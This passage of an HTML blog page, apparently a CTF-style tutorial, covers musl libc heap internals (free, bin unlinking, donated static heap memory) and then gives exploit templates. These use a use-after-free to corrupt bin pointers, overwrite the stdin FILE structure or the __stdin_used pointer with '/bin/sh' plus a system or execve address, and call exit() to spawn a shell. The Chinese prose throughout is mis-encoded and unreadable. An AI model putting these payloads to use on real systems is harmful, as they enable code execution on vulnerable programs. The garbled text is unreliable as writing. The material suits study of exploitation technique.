class="comment">//æ£€æµ‹è¯¥chunkçš„å‰åæ˜¯å¦å¤„äºç©ºé—²çŠ¶æ€</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//å¯¹äºä¸Šä¸€ä¸ªchunkï¼Œæ£€æµ‹å½“å‰chunkçš„psizeä½</span></span><br><span class="line">        <span class="comment">//å¯¹äºä¸‹ä¸€ä¸ªchunkï¼Œæ£€æµ‹ä¸‹ä¸€ä¸ªchunkçš„csizeä½</span></span><br><span class="line">		<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">//å‰åå¤„äºuseçŠ¶æ€ï¼Œé‚£ä¹ˆå¯¹å½“å‰chunkè¿›è¡Œé‡Šæ”¾å³å¯</span></span><br><span class="line">            <span class="comment">//æ¸…é™¤å½“å‰chunkçš„inuseä½ï¼Œä¸‹ä¸€ä¸ªchunkçš„psizeä½</span></span><br><span class="line">			self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">			next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">			i = bin_index(final_size);</span><br><span class="line">			lock_bin(i);</span><br><span class="line">			lock(mal.free_lock);</span><br><span class="line">            <span class="comment">//é€€å‡ºå¾ªç¯æ£€æµ‹</span></span><br><span class="line">			<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			unlock(mal.free_lock);</span><br><span class="line">			unlock_bin(i);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å‘ä¸Šåˆå¹¶ç©ºé—²çš„chunk</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">			self = PREV_CHUNK(self);</span><br><span class="line">			size = CHUNK_SIZE(self);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å‘ä¸‹åˆå¹¶ç©ºé—²çš„chunk</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">			size = CHUNK_SIZE(next);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">			next = NEXT_CHUNK(next);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è®¾ç½®å¯¹åº”binmapçš„æ ‡å¿—ä½ï¼Œbins[i]</span></span><br><span class="line">	<span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">		a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">	self-&gt;csize = final_size;</span><br><span class="line">	next-&gt;psize = final_size;</span><br><span class="line">	unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†å½“å‰chunkæ”¾åˆ°bins[i]çš„å°¾éƒ¨ï¼ŒFILOçš„å½¢å¼</span></span><br><span class="line">	self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">	self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">	self-&gt;next-&gt;prev = self;</span><br><span class="line">	self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">	<span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">		<span class="keyword">uintptr_t</span> a = (<span class="keyword">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">uintptr_t</span> b = (<span class="keyword">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		__madvise((<span class="keyword">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		__mmap((<span class="keyword">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-é™æ€å †å†…å­˜"   >
          <a href="#4-é™æ€å †å†…å­˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-é™æ€å †å†…å­˜" class="headerlink" title="4.é™æ€å †å†…å­˜"></a>4.é™æ€å †å†…å­˜</h2>
      <p>åœ¨Libcåˆå§‹åŒ–æ—¶ï¼Œå¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __dls3(<span class="keyword">size_t</span> *sp)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// ldso/dynlink.c L1839-L1840</span></span><br><span class="line">    <span class="comment">/* Donate unused parts of app and library mapping to malloc */</span></span><br><span class="line">    reclaim_gaps(&amp;app);</span><br><span class="line">    reclaim_gaps(&amp;ldso);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¼šè°ƒç”¨<code>reclaim_gaps</code>å‡½æ•°æŸ¥æ‰¾ç¨‹åºå’Œ libc åº“çš„ç©ºé—²å†…å­˜ï¼Œé€šå¸¸æ˜¯ä½äºDataæ®µä¸Šï¼Œè¯¥å‡½æ•°ä¸­ä¼šè°ƒç”¨<code>__malloc_donate</code>å‡½æ•°å°†ç©ºé—²å†…å­˜é‡Šæ”¾åˆ° binä¸­ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ldso/dynlink.c L526-L552</span></span><br><span class="line"><span class="comment">/* A huge hack: to make up for the wastefulness of shared libraries</span></span><br><span class="line"><span class="comment"> * needing at least a page of dirty memory even if they have no global</span></span><br><span class="line"><span class="comment"> * data, we reclaim the gaps at the beginning and end of writable maps</span></span><br><span class="line"><span class="comment"> * and &quot;donate&quot; them to the heap. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reclaim</span><span class="params">(struct dso *dso, <span class="keyword">size_t</span> start, <span class="keyword">size_t</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// é¿å¼€ RELRO æ®µ</span></span><br><span class="line">    <span class="keyword">if</span> (start &gt;= dso-&gt;relro_start &amp;&amp; start &lt; dso-&gt;relro_end) start = dso-&gt;relro_end;</span><br><span class="line">    <span class="keyword">if</span> (end   &gt;= dso-&gt;relro_start &amp;&amp; end   &lt; dso-&gt;relro_end) end = dso-&gt;relro_start;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">char</span> *base = laddr_pg(dso, start);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ __malloc_donate å‡½æ•°å°†å†…å­˜é‡Šæ”¾åˆ° bin ä¸­</span></span><br><span class="line">    __malloc_donate(base, base+(end-start));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reclaim_gaps</span><span class="params">(struct dso *dso)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Phdr *ph = dso-&gt;phdr;</span><br><span class="line">    <span class="keyword">size_t</span> phcnt = dso-&gt;phnum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ¯ä¸€ä¸ªæ®µ</span></span><br><span class="line">    <span class="keyword">for</span> (; phcnt--; ph=(<span class="keyword">void</span> *)((<span class="keyword">char</span> *)ph+dso-&gt;phentsize)) &#123;</span><br><span class="line">        <span class="comment">// æ¡ä»¶ 1ï¼šæ®µä¸å±äºå¯åŠ è½½æ®µï¼ˆPT_LOADï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type!=PT_LOAD) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// æ¡ä»¶ 2ï¼šæ®µå¯è¯»å¯å†™</span></span><br><span class="line">        <span class="keyword">if</span> ((ph-&gt;p_flags&amp;(PF_R|PF_W))!=(PF_R|PF_W)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// åœ¨æ®µæ‰€å±çš„å†…å­˜é¡µä¸­ï¼Œå°†æ®µå‰åçš„ç©ºé—²å†…å­˜ä¼ é€’ç»™ reclaim å‡½æ•°</span></span><br><span class="line">        reclaim(dso, ph-&gt;p_vaddr &amp; -PAGE_SIZE, ph-&gt;p_vaddr);</span><br><span class="line">        reclaim(dso, ph-&gt;p_vaddr+ph-&gt;p_memsz,</span><br><span class="line">            ph-&gt;p_vaddr+ph-&gt;p_memsz+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åˆå§‹åŒ–ç»“æŸåï¼Œåœ¨binsä¸­ä¼šå¤šå‡ºå‡ ä¸ªchunk</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171127046.png" alt="image-20220217112724849"></p>
<p>ä¸ä¸€å®šæ˜¯ä¸‰ä¸ªchunkï¼Œå¤šå°‘ä¸ªéƒ½æœ‰å¯èƒ½ï¼Œä¸»è¦çœ‹ç¨‹åºæˆ–è€…libcä¸­æ˜¯å¦å­˜åœ¨ç©ºé—²çš„å†…å­˜ã€‚ä¹‹åå†è¿›è¡Œå †å†…å­˜åˆ†é…æ—¶ï¼Œå°±ä¼šåœ¨è¿™ä¸ªåŸºç¡€ä¸Šè¿›è¡Œåˆ†é…ï¼Œè€Œéåœ¨æ‰€æœ‰binséƒ½æ˜¯ç©ºçš„çŠ¶æ€è¿›è¡Œåˆ†é…ã€‚</p>

        <h2 id="5-åˆ©ç”¨æ–¹å¼"   >
          <a href="#5-åˆ©ç”¨æ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-åˆ©ç”¨æ–¹å¼" class="headerlink" title="5.åˆ©ç”¨æ–¹å¼"></a>5.åˆ©ç”¨æ–¹å¼</h2>
      
        <h3 id="1-æ³„éœ²åœ°å€"   >
          <a href="#1-æ³„éœ²åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ³„éœ²åœ°å€" class="headerlink" title="(1)æ³„éœ²åœ°å€"></a>(1)æ³„éœ²åœ°å€</h3>
      
        <h4 id="â‘ åŸºäºé™æ€å †å†…å­˜"   >
          <a href="#â‘ åŸºäºé™æ€å †å†…å­˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åŸºäºé™æ€å †å†…å­˜" class="headerlink" title="â‘ åŸºäºé™æ€å †å†…å­˜"></a>â‘ åŸºäºé™æ€å †å†…å­˜</h4>
      <p>é‚£ä¹ˆåŸºäºé™æ€å †å†…å­˜çš„å­˜åœ¨ï¼Œç”±äºæœ€å¼€å§‹è¿›è¡Œåˆ†é…æ˜¯åœ¨å­˜åœ¨é™æ€å †å†…å­˜çš„æƒ…å†µä¸‹åˆ†é…çš„ï¼Œæ‰€ä»¥å¦‚æœç”³è¯·çš„chunkçš„sizeä¾æ®ç”³è¯·è§„åˆ™å¯ä»¥å¯¹é™æ€å †å†…å­˜è¿›è¡Œåˆ‡å‰²ï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡Œåˆ‡å‰²ï¼Œç”±äºæ˜¯åˆ‡å‰²çš„chunkï¼Œé‚£ä¹ˆæ­¤æ—¶è¿”å›çš„chunkçš„å°±ä¼šè‡ªç„¶è€Œç„¶å¸¦ä¸Šåœ°å€ã€‚</p>
<p>åŒæ ·çš„ï¼Œå½“ç¢°ä¸Šé™æ€å †å†…å­˜åˆå§‹åŒ–ä¹‹åï¼Œåœ¨ä¸€ä¸ªbinsä¸­åŒæ—¶å­˜åœ¨ç¨‹åºä¸­çš„chunkå’Œlibcä¸­çš„chunkæ—¶ï¼Œæˆ‘ä»¬å°†è¯¥chunkåˆ‡å‰²æˆ–è€…ç”³è¯·å‡ºæ¥ï¼Œå°±å¯ä»¥åŒæ—¶æ³„éœ²Libcåœ°å€å’Œç¨‹åºELFåœ°å€äº†ã€‚</p>

        <h4 id="â‘¡åŸºäºbins"   >
          <a href="#â‘¡åŸºäºbins" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡åŸºäºbins" class="headerlink" title="â‘¡åŸºäºbins"></a>â‘¡åŸºäºbins</h4>
      <p>å‰é¢æåˆ°ï¼Œé‡Šæ”¾åˆ°binsä¸­headæŒ‡é’ˆä¸‹chunkå¿…ç„¶ä¼šå¸¦ä¸Šlibcåœ°å€ï¼Œé‚£ä¹ˆç›´æ¥ç”³è¯·å›æ¥å°±å¯ä»¥è¿›è¡ŒLibcåœ°å€çš„æ³„éœ²</p>

        <h3 id="2-getshell"   >
          <a href="#2-getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell" class="headerlink" title="(2)getshell"></a>(2)getshell</h3>
      
        <h4 id="â‘ UAF"   >
          <a href="#â‘ UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ UAF" class="headerlink" title="â‘ UAF"></a>â‘ UAF</h4>
      
        <h5 id="æ–¹æ³•ä¸€ï¼š"   >
          <a href="#æ–¹æ³•ä¸€ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h5>
      <p>è¿™ç§æƒ…å†µå¯ä»¥ç›´æ¥é€šè¿‡æ”¹æ‰ä½äºbinä¸­headå¤´éƒ¨chunkçš„nextå’ŒprevæŒ‡é’ˆï¼Œç„¶åä»è¯¥binä¸­ç”³è¯·chunkï¼Œé€šè¿‡unbinå‡½æ•°ä¸­çš„å¦‚ä¸‹æ“ä½œå³å¯è¿›è¡Œä»»æ„åœ°å€ä»»æ„å†™ï¼Œå…¶ä¸­çš„cä¹Ÿå°±æ˜¯binä¸­çš„headæŒ‡å‘çš„chunkã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³çš„expæ¨¡æ¿å¦‚ä¸‹</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bins_a0h_addr = libc_base + <span class="number">0x292b28</span></span><br><span class="line">stdin_addr = libc_base + <span class="number">0x292200</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(bins_a0h_addr-<span class="number">0x10</span>)+p64(stdin_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_addr-<span class="number">0x10</span>)+p64(bins_a0h_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥è¿ç»­ç”¨ä¸¤æ¬¡ä¹Ÿæ²¡å•¥é—®é¢˜ï¼Œç”±äºæˆ‘ä»¬åŠ«æŒäº†è¿™ä¸ªæ”¹å†™æŒ‡é’ˆçš„æ“ä½œï¼Œæ‰€ä»¥åœ¨ç›¸å¯¹äºçš„binç»“æ„ä¸­çš„headå’ŒtailæŒ‡é’ˆå¹¶æ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚</p>
<p>ç”¨ä¸¤æ¬¡çš„åŸå› æ˜¯éœ€è¦åœ¨<code>stdin-&gt;prev</code>å’Œ<code>stdin-&gt;next</code>éƒ½å†™ä¸‹ä¸€ä¸ªå¯å†™åœ°å€ï¼Œè¿™æ ·ä¹‹åå†ä»å¯¹åº”binçš„headä¸­ç”³è¯·å‡ºæ¥æ—¶ï¼Œç»è¿‡unbinå‡½æ•°ä¸­çš„æŒ‡é’ˆèµ‹å€¼æ“ä½œä¸ä¼šå‡ºé”™ï¼Œå¦åˆ™å°±ä¼šå‡ºç°ä¸å¯å†™æˆ–è€…é›¶åœ°å€å–å€¼æ“ä½œå¯¼è‡´å¤±è´¥ã€‚</p>
<p>ä»¥ä¸Šæ“ä½œç»“æŸåå°±å¯ä»¥çœ‹åˆ°åœ¨bins[4]ï¼Œä¹Ÿæ˜¯0xa0å¤§å°å¯¹åº”çš„binä¸­çš„headæŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºstdin_addr-0x10ï¼ŒåŒæ—¶å¯¹åº”çš„stdinç»“æ„ä½“çš„prevå’ŒnextæŒ‡é’ˆä¹Ÿæ˜¯å¯å†™åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171857586.png" alt="image-20220217185755489"></p>
<p>ä¹‹åä»ä¸­bins[4]ä¸­ç”³è¯·chunkå³å¯ç”³è¯·å‡ºstdinç»“æ„ä½“ï¼Œä¹‹åå¯¹åº”ä¿®æ”¹æ‰€éœ€æ•°æ®å³å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;wpos != f-&gt;wbase</span><br><span class="line">f-&gt;flag = &quot;/bin/shx00&quot;</span><br><span class="line">f-&gt;write = system</span><br><span class="line">f-&gt;lock=0</span><br></pre></td></tr></table></div></figure>

<p>ç›¸åº”expæ¨¡æ¿å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(0xa0-0x20)</span><br><span class="line">edit(3,0x50+0x50,&quot;/bin/sh\x00&quot;+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(system_addr) + \</span><br><span class="line">	p64(0x0)*8)</span><br></pre></td></tr></table></div></figure>

<p>æœ€åè°ƒç”¨exit()å‡½æ•°å³å¯ï¼Œè°ƒç”¨é“¾ä¸º<code>exit()-&gt;__stdio_exit_needed()(//æˆ–è€…æ˜¯__stdio_exit)-&gt;close_file(__stdin_used)-&gt;f-&gt;write(f, 0, 0);</code>è¿™é‡Œçš„få³æ˜¯ä¼ å…¥çš„stdin</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// src/stdio/__stdio_exit.c</span><br><span class="line">static void close_file(FILE *f)</span><br><span class="line">&#123;</span><br><span class="line">	if (!f) return;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	if (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);</span><br><span class="line">	if (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __stdio_exit(void)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	for (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡ç”±äº<code>FFINALLOCK(f);</code>çš„å­˜åœ¨ï¼Œå¦‚æœè¿›å…¥è¿™ä¸ªå‡½æ•°ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šå´©æºƒï¼Œä¹Ÿå¯èƒ½æ˜¯æŸäº›è®¾ç½®ä¸Šçš„é—®é¢˜å—ï¼Ÿæ‰€ä»¥ä¸ºäº†ä¸è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆéœ€è¦å°†<code>f-&gt;lock</code>ç½®é›¶å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171832664.png" alt="image-20220217183236401"></p>
<p>æœ€åå³å¯è°ƒç”¨f-&gt;writeï¼Œå³åŠ«æŒçš„systemå‡½æ•°ï¼Œrdiä¸ºstdinç»“æ„ä½“ï¼Œæ¥getshell</p>
<p>æœ€ç»ˆå°æ¨¡æ¿å¦‚ä¸‹</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bins_a0h_addr = libc_base + <span class="number">0x292b28</span></span><br><span class="line">stdin_addr = libc_base + <span class="number">0x292200</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(bins_a0h_addr-<span class="number">0x10</span>)+p64(stdin_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_addr-<span class="number">0x10</span>)+p64(bins_a0h_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x50</span>+<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x1</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0x0</span>)+p64(system_addr) + \</span><br><span class="line">	p64(<span class="number">0x0</span>)*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h5 id="æ–¹æ³•äºŒï¼š"   >
          <a href="#æ–¹æ³•äºŒï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h5>
      <p>è¿™ä¸ªç›¸å¯¹æ–¹æ³•ä¸€å°±ç®€å•å¾ˆå¤šï¼Œåªéœ€è¦ä¸€ä¸ªä»»æ„åœ°å€å†™å³å¯ï¼Œæ€è·¯ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚</p>
<p>è§‚å¯Ÿä¸Šé¢çš„<code>__stdio_exit</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå…¶å®å®ƒæœ€åä½¿ç”¨çš„æ˜¯<code>__stdin_used</code>ï¼Œè€Œè¿™ä¸ªæ•°æ®ä¿å­˜ç€stdinç»“æ„ä½“æŒ‡é’ˆï¼Œå¹¶ä¸”è¯¥æ•°æ®ä½äºlibcä¸Šå¯è¯»å¯å†™å¤„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åŠ«æŒ<code>__stdin_used</code>ä¸‹çš„stdinç»“æ„ä½“æŒ‡é’ˆåˆ°å †ä¸Šï¼Œåœ¨å †ä¸Šä¼ªé€ æˆ‘ä»¬çš„æ•°æ®ï¼Œä»è€Œåœ¨è°ƒç”¨exitå‡½æ•°æ—¶ä»å †ä¸Šå–æ•°æ®æ‰§è¡Œæœ€ç»ˆçš„å‘½ä»¤ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">execve_addr = libc_base + libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">stdin_usedpoint_addr = libc_base + <span class="number">0x292430</span></span><br><span class="line">heap_addr = <span class="number">0x555555759000</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_usedpoint_addr-<span class="number">0x10</span>-<span class="number">0x8</span>)+p64(heap_addr+<span class="number">0x50</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>+<span class="number">0x50</span>+<span class="number">0x50</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x1</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0x0</span>)+p64(execve_addr) + \</span><br><span class="line">	p64(<span class="number">0x0</span>)*<span class="number">8</span>)</span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æœ€åçš„æ‰§è¡Œå‘½ä»¤å¤„ï¼Œrdiè¢«æˆåŠŸæ›´æ”¹ä¸ºå †ä¸Šçš„åœ°å€ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å¯¹åº”å¯»æ‰¾åç§»æ‰¾åˆ°äº†<code>execve</code>å‡½æ•°åœ°å€ï¼Œæ›´åŠ ç®€ä¾¿äº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171936093.png" alt="image-20220217193622906"></p>
<p>åŒæ—¶ç”±äºæœ€åè°ƒç”¨çš„<code>f-&gt;write(f,0,0)</code>ï¼Œå…¶ä¸­rsiå’Œrdxå¿…å®šä¸º0ï¼Œæ‰€ä»¥æ¨èè¿˜æ˜¯ä½¿ç”¨execveå‡½æ•°ï¼Œé˜²æ­¢systemå‡½æ•°å‡ºç°éé¢„æœŸçš„ä¸€äº›æ ˆç¯å¢ƒæˆ–è€…å…¶ä»–å˜åŒ–ï¼Œå¯¼è‡´æ— æ³•getshellã€‚</p>

        <h5 id="æ–¹æ³•ä¸‰ï¼š"   >
